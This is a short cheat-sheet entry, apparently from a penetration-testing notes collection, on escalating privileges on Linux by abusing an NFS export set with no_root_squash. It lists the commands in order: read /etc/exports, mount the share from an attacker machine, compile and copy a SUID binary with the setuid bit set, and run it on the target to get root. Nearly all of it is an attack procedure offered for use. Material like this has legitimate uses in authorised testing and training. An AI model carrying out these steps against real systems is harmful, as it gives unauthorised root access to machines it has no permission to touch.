---
title: NFS no_root_squash Abuse
category: privesc
subcategory: linux-privesc
os: linux
command: cat /etc/exports
tools: mount, gcc
---


### Identify writable export with no_root_squash

```bash
cat /etc/exports
```

Look for the `no_root_squash` flag.

### Mount the share on the attacker

```bash
mkdir -p /mnt/nfs/
mount -t nfs -o vers=3 $IP:<NFS-Share> /mnt/nfs/ -nolock
```

### Drop a SUID binary

```bash
gcc suid.c -o suid
cp suid /mnt/nfs/
chmod u+s /mnt/nfs/suid
```

### Trigger from the target

Switch to the matching user (UID-aligned) and run:

```bash
./suid
```
